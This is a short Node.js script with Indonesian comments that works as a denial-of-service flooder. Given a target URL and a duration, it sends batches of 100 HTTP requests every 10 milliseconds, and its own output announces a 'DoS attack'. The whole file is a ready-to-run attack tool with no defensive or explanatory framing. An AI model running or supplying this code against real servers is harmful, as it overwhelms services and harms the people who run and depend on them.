const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const requestsPerInterval = 100; // Jumlah permintaan per interval
const interval = 10; // Interval dalam milidetik

if (!target || isNaN(duration)) {
    console.log('Invalid Usage: node Load.js URL DURATION.');
    process.exit(1);
}

const fetch = require('node-fetch');

async function performAttack() {
    const promises = [];
    
    for (let i = 0; i < requestsPerInterval; i++) {
        // Menambahkan setiap permintaan ke dalam array promises
        promises.push(fetch(target).catch(err => {
            // Log error jika ada
            console.error(`Request failed: ${err}`);
        }));
    }

    // Tunggu hingga semua permintaan selesai
    await Promise.all(promises);
}

console.log(`Starting DoS attack on ${target} for ${duration} seconds...`);

const attackInterval = setInterval(performAttack, interval); // Eksekusi setiap interval untuk memaksimalkan beban

setTimeout(() => {
    clearInterval(attackInterval);
    console.log('Attack completed.');
    process.exit(0);
}, duration * 1000);
